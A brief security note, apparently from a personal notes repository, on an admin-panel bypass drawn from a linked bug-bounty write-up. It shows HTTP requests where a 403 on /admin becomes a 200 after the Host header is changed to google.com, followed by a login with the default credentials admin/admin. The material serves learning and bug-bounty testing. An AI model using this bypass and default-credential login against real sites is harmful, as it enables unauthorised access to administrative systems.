## Admin Panel Bypass Techniques:-

- Original Request/Respons was looked like:
```
GET /admin HTTP/1.1
Host: redacted.com
```
```
HTTP/1.1 403 Forbidden
Access Denied
```

![1_-xZ8H__gr_jwC4XEu9aN5w](https://github.com/amjadali-110/Notes/assets/140477743/0d08c472-bc13-4d24-94e7-575db3d905e4)


- Modified Request/Response (Bypass):
```
GET /admin HTTP/1.1
Host: google.com
```
```
HTTP/1.1 200 Ok
Admin Panel Login Page(Source Code)
```

- Try Deafult Credentials

![1_rIzvMlzO22wqjtUNX9t7sA](https://github.com/amjadali-110/Notes/assets/140477743/7abf6b10-ef8c-4d93-a17a-130097671a72)



### Steps to Reproduce (According to Report):
- Navigate to “​https://redacted.com/admin" give (403 error).
- Then intercept that request with the help of Burp Suite.
- After intercept that request simply change the host header value from redacted.com to​​ google.com & hit Go.
- You will found that the server does not validate that request properly. It simply opens up an admin panel login page.
- Now Error Changes into 403 Forbidden to 200 OK (Bypassing Done)
- But now I don’t have the right credentials to get access to the admin panel.
- Luckily I tried ‘admin’ as a username and ‘admin’ as a password.
- Got Success.


-------------------------------------------------------------------------------------------------------------------------

- https://sechunter.medium.com/exploiting-admin-panel-like-a-boss-fc2dd2499d31
